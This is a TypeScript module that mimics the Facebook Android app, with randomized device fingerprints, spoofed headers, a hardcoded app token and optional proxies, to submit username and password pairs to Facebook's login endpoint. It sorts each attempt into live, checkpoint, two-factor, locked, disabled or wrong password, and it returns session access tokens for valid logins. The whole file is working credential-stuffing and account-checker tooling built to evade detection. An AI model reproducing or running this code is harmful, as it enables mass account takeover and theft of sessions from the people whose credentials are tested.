import { randomUUID } from "crypto";
import { ProxyAgent, fetch as undiciFetch } from "undici";

interface AndroidDevice {
  model: string;
  brand: string;
  build: string;
  os: string;
  dpi: number;
  carrier: string;
}

const ANDROID_DEVICES: AndroidDevice[] = [
  { model: "SM-G973F", brand: "samsung", build: "G973FXXU6ETL3", os: "10", dpi: 550, carrier: "T-Mobile" },
  { model: "SM-G985F", brand: "samsung", build: "G985FXXU7DTJ2", os: "11", dpi: 545, carrier: "AT&T" },
  { model: "SM-G991B", brand: "samsung", build: "G991BXXU5CUK1", os: "12", dpi: 421, carrier: "Verizon" },
  { model: "SM-G998B", brand: "samsung", build: "G998BXXU4DUJ7", os: "12", dpi: 516, carrier: "T-Mobile" },
  { model: "SM-A526B", brand: "samsung", build: "A526BXXU5CVJ1", os: "11", dpi: 405, carrier: "AT&T" },
  { model: "Pixel 4 XL", brand: "google", build: "QQ3A.200805.001", os: "11", dpi: 537, carrier: "Google Fi" },
  { model: "Pixel 5", brand: "google", build: "RQ3A.210805.001.A1", os: "11", dpi: 432, carrier: "T-Mobile" },
  { model: "Pixel 6", brand: "google", build: "SD1A.210817.036", os: "12", dpi: 411, carrier: "T-Mobile" },
  { model: "OnePlus 8 Pro", brand: "oneplus", build: "IN2023_11.0.9.9", os: "11", dpi: 513, carrier: "Sprint" },
  { model: "Mi 10", brand: "xiaomi", build: "QKQ1.191117.002", os: "11", dpi: 386, carrier: "Verizon" },
  { model: "Redmi Note 9", brand: "xiaomi", build: "QKQ1.200114.002", os: "10", dpi: 395, carrier: "AT&T" },
  { model: "POCO X3 Pro", brand: "xiaomi", build: "RKQ1.200826.002", os: "11", dpi: 395, carrier: "T-Mobile" },
  { model: "CPH2127", brand: "oppo", build: "CPH2127_11_OTA_0220_all_v52", os: "11", dpi: 461, carrier: "T-Mobile" },
  { model: "Moto G Power", brand: "motorola", build: "RPSS31.Q1-45-41-4", os: "10", dpi: 269, carrier: "Cricket" },
];

const LOCALES = ["en_US", "en_GB", "en_CA", "en_AU"];

function randInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randHex(length: number): string {
  return Array.from({ length }, () => Math.floor(Math.random() * 16).toString(16)).join("");
}

function formatUUID(): string {
  return [
    randHex(8),
    randHex(4),
    "4" + randHex(3),
    (8 + randInt(0, 3)).toString(16) + randHex(3),
    randHex(12),
  ].join("-");
}

export interface FbDevice {
  fbav: string;
  fbbv: string;
  adid: string;
  deviceId: string;
  familyDeviceId: string;
  model: string;
  brand: string;
  build: string;
  os: string;
  locale: string;
  carrier: string;
  userAgent: string;
  accessToken: string;
}

const FB_APP_TOKEN = "350685531728|62f8ce9f74b12f84c123cc23437a4a32";

export function randomFbDevice(): FbDevice {
  const device = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)];
  const fbav = `${randInt(350, 410)}.0.0.${randInt(11, 99)}.${randInt(111, 999)}`;
  const fbbv = String(randInt(200000000, 320000000));
  const adid = formatUUID();
  const deviceId = formatUUID();
  const familyDeviceId = formatUUID();
  const locale = LOCALES[Math.floor(Math.random() * LOCALES.length)];

  const userAgent = [
    `[FBAN/FB4A`,
    `FBAV/${fbav}`,
    `FBBV/${fbbv}`,
    `FBDM/{density=${(device.dpi / 160).toFixed(1)},width=1080,height=1920}`,
    `FBLC/${locale}`,
    `FBCR/${device.carrier}`,
    `FBMF/${device.brand}`,
    `FBBD/${device.brand}`,
    `FBDV/${device.model}`,
    `FBSV/${device.os}.0.0`,
    `FBCA/arm64-v8a:armeabi-v7a`,
    `FBFW/1`,
    `FBRV/0`,
    `FBPN/com.facebook.katana`,
    `FBCFT/0`,
    `FBOP/1`,
    `FBDPI/${device.dpi}]`,
  ].join(";");

  return {
    fbav,
    fbbv,
    adid,
    deviceId,
    familyDeviceId,
    model: device.model,
    brand: device.brand,
    build: device.build,
    os: device.os,
    locale,
    carrier: device.carrier,
    userAgent,
    accessToken: FB_APP_TOKEN,
  };
}

export type LoginStatus = "live" | "dead" | "checkpoint" | "2fa" | "locked" | "disabled" | "wrongpass";

export interface LoginResult {
  status: LoginStatus;
  accessToken: string | null;
  errorCode?: number;
  errorSubcode?: number;
}

export async function checkFbLogin(uid: string, password: string, proxyUrl?: string): Promise<LoginResult> {
  const device = randomFbDevice();

  const params = new URLSearchParams();
  params.append("adid", device.adid);
  params.append("format", "json");
  params.append("device_id", device.deviceId);
  params.append("cpl", "true");
  params.append("family_device_id", device.familyDeviceId);
  params.append("credentials_type", "device_based_login_password");
  params.append("error_detail_type", "button_with_disabled");
  params.append("source", "device_based_login");
  params.append("email", uid);
  params.append("password", password);
  params.append("access_token", device.accessToken);
  params.append("generate_session_cookies", "1");
  params.append("meta_inf_fbmeta", "NO_FILE");
  params.append("advertiser_id", device.adid);
  params.append("currently_logged_in_userid", "0");
  params.append("locale", device.locale);
  params.append("client_country_code", "US");
  params.append("method", "auth.login");
  params.append("fb_api_req_friendly_name", "authenticate");
  params.append("fb_api_caller_class", "com.facebook.account.login.protocol.Fb4aAuthHandler");

  try {
    const fetchHeaders = {
      "Content-Type": "application/x-www-form-urlencoded",
      "User-Agent": device.userAgent,
      "Host": "graph.facebook.com",
      "X-FB-Net-HNI": String(randInt(20000, 40000)),
      "X-FB-SIM-HNI": String(randInt(20000, 40000)),
      "X-FB-Connection-Type": "MOBILE.LTE",
      "X-Tigon-Is-Retry": "False",
      "X-FB-HTTP-Engine": "Liger",
      "Connection": "keep-alive",
      "Accept-Language": device.locale.replace("_", "-"),
    };

    let res: Response;
    if (proxyUrl) {
      const dispatcher = new ProxyAgent(proxyUrl);
      res = await undiciFetch("https://graph.facebook.com/auth/login", {
        method: "POST",
        headers: fetchHeaders,
        body: params.toString(),
        signal: AbortSignal.timeout(15_000),
        dispatcher,
      }) as unknown as Response;
    } else {
      res = await fetch("https://graph.facebook.com/auth/login", {
        method: "POST",
        headers: fetchHeaders,
        body: params.toString(),
        signal: AbortSignal.timeout(15_000),
      });
    }

    const text = await res.text();
    let json: Record<string, unknown>;
    try {
      json = JSON.parse(text) as Record<string, unknown>;
    } catch {
      return { status: "dead", accessToken: null };
    }

    if (json.access_token && typeof json.access_token === "string") {
      return { status: "live", accessToken: json.access_token };
    }

    const errObj = json.error as Record<string, unknown> | undefined;
    if (!errObj) {
      return { status: "dead", accessToken: null };
    }

    const code = Number(errObj.code ?? 0);
    const subcode = Number(errObj.error_subcode ?? 0);
    const msg = String(errObj.message ?? errObj.error_user_msg ?? "").toLowerCase();
    const type = String(errObj.type ?? "").toLowerCase();

    if (
      subcode === 406 ||
      msg.includes("checkpoint") ||
      msg.includes("please review") ||
      msg.includes("confirm your identity")
    ) {
      return { status: "checkpoint", accessToken: null, errorCode: code, errorSubcode: subcode };
    }

    if (
      subcode === 464 ||
      msg.includes("two_factor") ||
      msg.includes("two factor") ||
      msg.includes("confirmation code") ||
      msg.includes("security code")
    ) {
      return { status: "2fa", accessToken: null, errorCode: code, errorSubcode: subcode };
    }

    if (
      msg.includes("locked") ||
      msg.includes("suspicious") ||
      msg.includes("temporarily blocked")
    ) {
      return { status: "locked", accessToken: null, errorCode: code, errorSubcode: subcode };
    }

    if (
      code === 190 ||
      msg.includes("disabled") ||
      msg.includes("removed") ||
      type.includes("oauthexception") && msg.includes("invalid")
    ) {
      return { status: "disabled", accessToken: null, errorCode: code, errorSubcode: subcode };
    }

    if (
      subcode === 460 ||
      subcode === 401 ||
      msg.includes("wrong password") ||
      msg.includes("incorrect password") ||
      msg.includes("password you entered") ||
      (code === 401 && subcode !== 406 && subcode !== 464)
    ) {
      return { status: "wrongpass", accessToken: null, errorCode: code, errorSubcode: subcode };
    }

    return { status: "dead", accessToken: null, errorCode: code, errorSubcode: subcode };
  } catch {
    return { status: "dead", accessToken: null };
  }
}
